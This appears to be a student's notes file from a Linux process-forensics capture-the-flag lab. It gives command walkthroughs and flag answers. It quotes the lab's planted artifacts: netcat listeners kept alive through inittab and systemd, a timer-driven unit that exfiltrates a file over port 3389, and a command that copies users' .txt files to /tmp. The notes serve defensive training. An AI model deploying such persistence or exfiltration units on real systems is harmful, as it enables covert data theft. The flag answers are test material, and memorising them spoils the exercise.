
------------------------------------------
# Finding the parent process ID of the user logged in shell
```shell
ps -elf --forest
    #this will show the parent pcoress binaries that ran a program
```
-------------------------------------------
# Find the Arguement given to the ntpd Daemon
```shell
ps -elf #identify if the ntpd daemon is running
ps -elf --forest | grep ntpd # grep out the ntpd daemon
#With the below output you can see arguments sent to the ntp daemon
CODE OUPUT;
5 S ntp       1435     1  0  80   0 - 23949 -      May04 ?        00:00:47 /usr/sbin/ntpd -p /var/run/ntpd.pid -g -u105:109
 0 S bombadil  4436  3956  0  80   0 -  3179 -      14:49 pts/0    00:00:00              \_ grep ntpd
#looking at the end of the ntpd you can see the given argument (-p /var/run/ntpd.pid -g -u 105:109)
```
-------------------------------------------

# Identify the file mapped to the fourth file descriptor (handle) of the cron process.
```shell
#Look for FILE DESCRIPTORS
sudo lsof | Less #List-Open-Files(LSOF) 
sudo lsof | grep cron #lsof and grep out cron. look for fourth "FILE" descriptor
[lsof] /cron #this will search for the cron string. Then looking for the descriptor column
OUTPUT cron       1327            root    3u      REG               0,19        5      11513 /run/crond.pid
```   
-------------------------------------------
# Identify the permissions that cron has on the file identified in Processes 5.
```shell
sudo lsof | Less #view open files
[lsof] /cron #this will search for the cron string. Then looking for the descriptor column. answer is 3u
OUTPUT cron       1327            root    3u      REG               0,19        5      11513 /run/crond.pid
```
-------------------------------------------
# Identify the names of the orphan processes on the SysV system.
```shell
htop #run htop to view currently running processes
f5 #this will show the tree for child processes
ANSWER==aragorn,brucewayne,eowyn,tolkien
```
-------------------------------------------
# Locate zombie processes on the SysV system and parent process
## zombie processes only live until the parent process kills them. MUST monitor process list
```shell
htop #look for process spawning zombie processes
    #zombie processes will show a "z"
```
-------------------------------------------
# Locate the strange open port on the SysV system.
```shell
htop #run htop to view binaries being ran with additonal /binbash command/arguments
nestat -ano #also useful
```
-------------------------------------------
# Examine the process list to find the ssh process. Then, identify the symbolic link to the absolute path for its EXECUTABLE in the /proc directory.
## The flag is the absolute path to the symbolic link, and the file it is linked to.
```shell
ps -elf | grep ssh #lists the current processes, grepping ssh
sudo find /proc/1750 -type l -ls | grep ssh #This will look in the proc folder for links grepping ssh
#OUTPUT;
bombadil@minas-tirith:~$ sudo find /proc/1750 -type l -ls | grep ssh
 13637188      0 lrwxrwxrwx   1 root     root            0 May 16 15:56 /proc/1750/task/1750/exe -> /usr/sbin/sshd
 13637342      0 lr--------   1 root     root           64 May 16 15:56 /proc/1750/map_files/556de7950000-556de7a0d000 -> /usr/sbin/sshd
 13637343      0 lr--------   1 root     root           64 May 16 15:56 /proc/1750/map_files/556de7c0d000-556de7c10000 -> /usr/sbin/sshd
 13637344      0 lr--------   1 root     root           64 May 16 15:56 /proc/1750/map_files/556de7c10000-556de7c11000 -> /usr/sbin/sshd
 13587053      0 lrwxrwxrwx   1 root     root            0 May 16 15:02 /proc/1750/exe -> /usr/sbin/sshd #This is the symbolic link of the executable to the ssh binary
```
---------------------------------------------
# Identify the file that contains udp connection information. Identify the process using port 123.
## Process Name, File Descriptor, Permission
```shell
netstat -ano # This will show your open sockets and established/listening lines
sudo lsof -i :123 #this will search files open using socket 123
#OUTPUT;
bombadil@minas-tirith:/proc/1750$ sudo lsof -i :123
COMMAND  PID USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
ntpd    1435  ntp   16u  IPv6  11574      0t0  UDP *:ntp
ntpd    1435  ntp   17u  IPv4  11577      0t0  UDP *:ntp
ntpd    1435  ntp   18u  IPv4  11582      0t0  UDP localhost:ntp
ntpd    1435  ntp   19u  IPv4  11584      0t0  UDP 10.10.0.7:ntp #here is the UDP connection information being stored w/PID 1435
ntpd    1435  ntp   20u  IPv6  11586      0t0  UDP ip6-localhost:ntp
ntpd    1435  ntp   21u  IPv6  11588      0t0  UDP [fe80::f816:3eff:fede:a244]:ntp

sudo lsof | grep 1435 | grep 10.10.0.7 #run lsof grepping a line w/PID and UDP information

bombadil@minas-tirith:/proc/1750$ sudo lsof | grep 10.10.0.7 | grep 1435
ntpd       1435             ntp   19u     IPv4              11584      0t0        UDP 10.10.0.7:ntp
ntpd       1435 1457        ntp   19u     IPv4              11584      0t0        UDP 10.10.0.7:ntp
#This is how you would see secuirty descriptor and permissions, the PROCESS NAME = ntpd FILE = 19, PERM = u
```
---------------------------------------------  
# Locate the strange open port how and persists between reboots.
## The flag is the absolute path for the file that contains the persistence mechanism, and the configuration 
```shell
netstat -ano #identifiy strange port thats open
htop #use this to see parent process for suspect port listener
#/bin/netcat -lp 9999, its an orphan process so now your going to need to dig into conf files
cat /etc/inittab #View the inittab boot confirguation file to find suspect persistance
#suspect output within inittab file
6:23:respawn:/sbin/getty 38400 tty6
90:2345:respawn:/sauron
91:2345:respawn:/bin/netcat -lp 9999 #perisitance entry in startup file
 ANSWER===  /etc/inittab,91:2345:respawn:/bin/netcat -lp 9999
```
---------------------------------------------

# Scenario: The Villains group has been chanting offerings to their new leader at regular intervals over a TCP connection. Task: Identify their method of communication and how it is occurring. Locate the following artifacts: ** The chant/text used by each villain (include spaces) ** The new Lord receiving the offering ** The IP address and port that the offering is received over
```powershell
htop
    f5 #open htop and find the chants string showing it
    cp /home ~/Desktop
    mkdir /home/bombdail/new;cp -r /home/King_Of_The_Dead /home/bombadil/new;cp -r /home/Balrog /home/bombadil/new;cp -r /home witch_king /home/bombadil/new;cp -r /home/Lurtz /home/bombadil/new;
    ls -l /home/witch_king #cd into the directory
    cat chant #view the chant for each and the ip its going to "offering"
 ANSWER====Mausan ukoul for avhe mubullat goth,witch_king,127.0.0.1:1234
 ```
 ---------------------------------------------
Identify one of the human-readable file handles by the other program that creates a zombie process.
NOTE: Remember, zombie processes only live until the parent process kills them. Try monitoring the processes list with top or htop to find them.
The flag is the text from one of the files it reads.
htop, then f5 # this will show tree
sudo lsof | grep 16238 #get the pid and do an LSOF of the pid to get the files
    cat /opt/mysoul
ANSWER==and in the darkness bind them
-----------------------------------------------
Scenario: Someone or something is stealing files with a .txt extension from user directories. Determine how these thefts are occurring.
Task: Identify the command being ran and how it occurs.
Flag format: command,how it occurs
 Machine: Terra
 /bin/bash -c netcat -lp 3389 < /tmp/NMAP_all_hosts.txt
    netcat -lp 3389
 ssh gerviel@10.10.0.6
#### 
go into etc/systemd/system
find / -type f -exec grep -H '~/. bash_history ' {} \;
sudo find / -type f -exec grep -H '.bash_history' {} \;
# this command will look for a file that is tryign to look for a txt
#Look through the below folders with the command unitl you find the string
ANSWER==
service running, check systemd
/bin/bash -c 'find /home -name \*.txt -exec cp {} /tmp \;,vestrisecreta.service
/etc/systemd
/etc/init.d
/lib/systemd/system
---------------------------------------------------
Scenario: Text files are being exfiltrated from the machine using a network connection. The connections still occur post-reboot, according to network analysts.
The junior analysts are having a hard time with attribution because no strange programs or ports are running, and the connection seems to only occur in 60-second intervals, every 15 minutes.
Task: Determine the means of persistence used by the program, and the port used. The flag is the command that allows exfiltration, and the file its persistence mechanism uses.
Flag format: command,persistence
Machine: Terra
###################### After viewing the below informaiton you can determine the command is being ran with the persistance being the .timer
ANSWER==netcat -lp 3389 < /tmp/NMAP_all_hosts.txt,whatischaos.timer

 found whatischaos.service
    [Unit]
    Description=Run a service
    [Service]
    Type=exec
    ExecStart=/bin/bash -c 'netcat -lp 3389 < /tmp/NMAP_all_hosts.txt'
    Restart=no
    RuntimeMaxSec=60s
garviel@terra:/lib/systemd/system$ cat whatischaos.timer 
    [Unit]
    Description=Run a prolsofgram on a timer
    [Timer]
    OnBootSec=3m
    OnUnitActiveSec=15m
    [Install]
    WantedBy=timers.target
garviel@terra:/lib/systemd/system$ cat apache3.service 
    [Unit]
    Description=Creates a web server
    [Service]
    Type=simple
    ExecStart=/bin/bash -c '/bin/apache3 -lp 443 < /dev/urandom'
    ANSWER==/bin/apache3 -lp 443 < /dev/urandom,apache3.service
    Restart=always
    RestartSec=10
    [Install]
    WantedBy=multi-user.target


-------------------
 sudo lsof | grep 1059



